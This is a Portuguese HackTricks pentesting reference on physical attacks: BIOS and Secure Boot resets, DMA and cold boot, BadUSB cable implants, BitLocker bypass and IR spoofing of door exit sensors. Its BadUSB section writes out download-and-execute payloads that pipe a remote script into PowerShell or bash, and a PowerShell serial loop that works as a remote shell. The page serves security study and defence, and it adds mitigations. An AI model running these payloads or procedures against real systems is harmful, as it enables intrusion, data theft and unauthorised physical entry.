# Ataques Físicos

{{#include ../banners/hacktricks-training.md}}

## Recuperação de Senha do BIOS e Segurança do Sistema

**Redefinir o BIOS** pode ser feito de várias maneiras. A maioria das **placas-mãe** inclui uma **bateria** que, quando removida por cerca de **30 minutos**, irá redefinir as configurações do BIOS, incluindo a senha. Alternativamente, um **jumper na placa-mãe** pode ser ajustado para redefinir essas configurações conectando pinos específicos.

Para situações em que ajustes de hardware não são possíveis ou práticos, **ferramentas de software** oferecem uma solução. Executar um sistema a partir de um **Live CD/USB** com distribuições como **Kali Linux** fornece acesso a ferramentas como **_killCmos_** e **_CmosPWD_**, que podem auxiliar na recuperação da senha do BIOS.

Nos casos em que a senha do BIOS é desconhecida, digitá-la incorretamente **três vezes** normalmente resultará em um código de erro. Esse código pode ser usado em sites como [https://bios-pw.org](https://bios-pw.org) para potencialmente recuperar uma senha utilizável.

### Segurança UEFI

Para sistemas modernos que usam **UEFI** em vez do BIOS tradicional, a ferramenta **chipsec** pode ser utilizada para analisar e modificar as configurações do UEFI, incluindo a desativação do **Secure Boot**. Isso pode ser feito com o seguinte comando:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM Analysis and Cold Boot Attacks

RAM retém dados brevemente após a energia ser cortada, normalmente por **1 a 2 minutos**. Essa persistência pode ser estendida para **10 minutos** aplicando substâncias frias, como nitrogênio líquido. Durante esse período estendido, um **memory dump** pode ser criado usando ferramentas como **dd.exe** e **volatility** para análise.

---

## Direct Memory Access (DMA) Attacks

**INCEPTION** é uma ferramenta projetada para **manipulação física da memória** através de DMA, compatível com interfaces como **FireWire** e **Thunderbolt**. Permite contornar procedimentos de login patchando a memória para aceitar qualquer senha. No entanto, é ineficaz contra sistemas **Windows 10**.

---

## Live CD/USB for System Access

Substituir binários do sistema como **_sethc.exe_** ou **_Utilman.exe_** por uma cópia de **_cmd.exe_** pode fornecer um prompt de comando com privilégios de sistema. Ferramentas como **chntpw** podem ser usadas para editar o arquivo **SAM** de uma instalação Windows, permitindo alterar senhas.

**Kon-Boot** é uma ferramenta que facilita o login em sistemas Windows sem conhecer a senha, modificando temporariamente o kernel do Windows ou o UEFI. Mais informações podem ser encontradas em [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).

---

## Handling Windows Security Features

### Boot and Recovery Shortcuts

- **Supr**: Acessar as configurações do BIOS.  
- **F8**: Entrar no modo Recovery.  
- Pressionar **Shift** após o banner do Windows pode contornar o autologon.

### BAD USB Devices

Dispositivos como **Rubber Ducky** e **Teensyduino** servem como plataformas para criar dispositivos **bad USB**, capazes de executar payloads pré-definidos quando conectados a um computador alvo.

### Volume Shadow Copy

Privilégios de administrador permitem a criação de cópias de arquivos sensíveis, incluindo o arquivo **SAM**, através do **PowerShell**.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- Implantes baseados em **ESP32-S3** como **Evil Crow Cable Wind** se escondem dentro de cabos **USB-A→USB-C** ou **USB-C↔USB-C**, enumeram-se como um teclado USB e expõem sua stack de **C2** via Wi‑Fi. O operador só precisa alimentar o cabo a partir do host da vítima, criar um hotspot chamado `Evil Crow Cable Wind` com a senha `123456789`, e navegar até [http://cable-wind.local/](http://cable-wind.local/) (ou seu endereço DHCP) para acessar a interface HTTP embarcada.
- A UI do browser fornece abas para *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* e *Config*. Payloads armazenados são etiquetados por OS, layouts de teclado são trocados dinamicamente, e strings de VID/PID podem ser alteradas para imitar periféricos conhecidos.
- Como o **C2** vive dentro do cabo, um telefone pode preparar payloads, disparar a execução e gerenciar credenciais Wi‑Fi sem tocar no OS do host — ideal para intrusões físicas de curta duração.

### OS-aware AutoExec payloads

- Regras AutoExec vinculam um ou mais payloads para disparar imediatamente após a enumeração USB. O implante realiza um fingerprinting leve do OS e seleciona o script correspondente.
- Exemplo de workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) ou `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Como a execução é não assistida, simplesmente trocar um cabo de carga pode alcançar o acesso inicial “plug-and-pwn” no contexto do usuário logado.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Um payload armazenado abre um console e cola um loop que executa o que chegar no novo **USB serial device**. Uma variante mínima para Windows é:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** O implant mantém o canal USB CDC aberto enquanto seu ESP32-S3 lança um cliente TCP (Python script, Android APK, or desktop executable) de volta para o operador. Quaisquer bytes digitados na sessão TCP são encaminhados para o serial loop acima, proporcionando execução remota de comandos mesmo em hosts air-gapped. A saída é limitada, então os operadores tipicamente executam comandos às cegas (criação de contas, preparação de ferramentas adicionais, etc.).

### Superfície de atualização OTA via HTTP

- A mesma web stack geralmente expõe atualizações de firmware não autenticadas. Evil Crow Cable Wind escuta em `/update` e grava qualquer binário enviado:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Operadores de campo podem hot-swap features (e.g., flash USB Army Knife firmware) mid-engagement sem abrir o cabo, permitindo que o implant pivot para novas capacidades enquanto ainda está conectado ao host alvo.

## Contornando a criptografia do BitLocker

BitLocker encryption pode potencialmente ser bypassed se a **recovery password** for encontrada dentro de um despejo de memória (**MEMORY.DMP**). Ferramentas como **Elcomsoft Forensic Disk Decryptor** ou **Passware Kit Forensic** podem ser utilizadas para esse fim.

---

## Engenharia Social para Adição de Recovery Key

Uma nova recovery key do BitLocker pode ser adicionada através de táticas de engenharia social, convencendo um usuário a executar um comando que adiciona uma nova recovery key composta por zeros, simplificando assim o processo de descriptografia.

---

## Explorando Chassis Intrusion / Maintenance Switches para o reset de fábrica do BIOS

Muitos laptops modernos e desktops small-form-factor incluem um **chassis-intrusion switch** que é monitorado pelo Embedded Controller (EC) e pelo firmware BIOS/UEFI. Enquanto o propósito primário do switch é disparar um alerta quando um dispositivo é aberto, fabricantes às vezes implementam um **atalho de recuperação não documentado** que é acionado quando o switch é alternado em um padrão específico.

### How the Attack Works

1. O switch está ligado a uma **GPIO interrupt** no EC.
2. O firmware rodando no EC acompanha o **tempo e o número de pressionamentos**.
3. Quando um padrão hard-coded é reconhecido, o EC invoca uma rotina *mainboard-reset* que **apaga o conteúdo do NVRAM/CMOS do sistema**.
4. No próximo boot, o BIOS carrega valores padrão – **a senha de supervisor, as Secure Boot keys, e toda configuração personalizada são apagadas**.

> Uma vez que o Secure Boot está desativado e a senha do firmware se foi, o atacante pode simplesmente inicializar qualquer imagem de OS externa e obter acesso irrestrito aos discos internos.

### Real-World Example – Framework 13 Laptop

O atalho de recuperação para o Framework 13 (11th/12th/13th-gen) é:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Após o décimo ciclo o EC define uma flag que instrui a BIOS a apagar o NVRAM no próximo reboot. Todo o procedimento leva ~40 s e requer **apenas uma chave de fenda**.

### Generic Exploitation Procedure

1. Ligue ou faça suspend-resume no alvo para que o EC esteja em execução.
2. Remova a tampa inferior para expor o interruptor de intrusão/manutenção.
3. Reproduza o padrão de alternância específico do fornecedor (consulte documentação, fóruns ou reverse-engineer o firmware do EC).
4. Remonte e reinicie – as proteções do firmware devem estar desativadas.
5. Inicialize a partir de um live USB (e.g. Kali Linux) e execute o post-exploitation usual (credential dumping, exfiltração de dados, implantação de binários EFI maliciosos, etc.).

### Detection & Mitigation

* Registre eventos de intrusão no chassi no console de gestão do OS e correlacione com resets inesperados da BIOS.
* Utilize **selos que evidenciem violação** nos parafusos/tampas para detectar abertura.
* Mantenha dispositivos em **áreas fisicamente controladas**; assuma que acesso físico equivale a comprometimento total.
* Quando disponível, desative o recurso do fornecedor “maintenance switch reset” ou exija uma autorização criptográfica adicional para resets de NVRAM.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Sensores comerciais “wave-to-exit” emparelham um emissor LED near-IR com um módulo receptor estilo TV-remote que só relata logic high depois de ver múltiplos pulsos (~4–10) do carrier correto (≈30 kHz).
- Uma cobertura plástica bloqueia o emissor e o receptor de se verem diretamente, então o controlador assume que qualquer carrier validado veio de uma reflexão próxima e aciona um relay que abre a fechadura da porta.
- Uma vez que o controlador acredita que um alvo está presente, ele frequentemente muda o envelope de modulação de saída, mas o receptor continua aceitando qualquer burst que corresponda ao carrier filtrado.

### Attack Workflow
1. **Capture the emission profile** – prenda um analisador lógico nas trilhas do controlador para gravar tanto as formas de onda pré-detecção quanto as pós-detecção que dirigem o LED IR interno.
2. **Replay only the “post-detection” waveform** – remova/ignore o emissor original e conduza um LED IR externo com o padrão já disparado desde o início. Como o receptor só se importa com contagem/frequência de pulsos, ele trata o carrier falsificado como uma reflexão genuína e ativa a linha do relay.
3. **Gate the transmission** – transmita o carrier em rajadas ajustadas (e.g., dezenas de milissegundos ligado, similar desligado) para entregar a contagem mínima de pulsos sem saturar o AGC do receptor ou sua lógica de tratamento de interferência. Emissão contínua dessensibiliza rapidamente o sensor e impede que o relay dispare.

### Long-Range Reflective Injection
- Substituir o LED de bancada por um diodo IR de alta potência, driver MOSFET e óptica de foco permite acionar de forma confiável a ~6 m de distância.
- O atacante não precisa de linha de visão direta para a abertura do receptor; apontar o feixe para paredes internas, prateleiras ou batentes de porta visíveis através de vidro permite que energia refletida entre no campo de visão de ~30° e imite um aceno de mão próximo.
- Como os receptores esperam apenas reflexões fracas, um feixe externo muito mais forte pode ricochetear em múltiplas superfícies e ainda permanecer acima do limiar de detecção.

### Weaponised Attack Torch
- Embutir o driver dentro de uma lanterna comercial esconde a ferramenta à vista. Troque o LED visível por um LED IR de alta potência compatível com a banda do receptor, adicione um ATtiny412 (ou similar) para gerar rajadas de ≈30 kHz, e use um MOSFET para drenar a corrente do LED.
- Uma lente telescópica de zoom estreita o feixe para alcance/precisão, enquanto um motor de vibração controlado pelo MCU fornece confirmação háptica de que a modulação está ativa sem emitir luz visível.
- Variar entre vários padrões de modulação armazenados (frequências de carrier e envelopes ligeiramente diferentes) aumenta a compatibilidade entre famílias de sensores rebrandadas, permitindo ao operador varrer superfícies refletivas até o relay clicar audivelmente e a porta liberar.

---

## References

- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
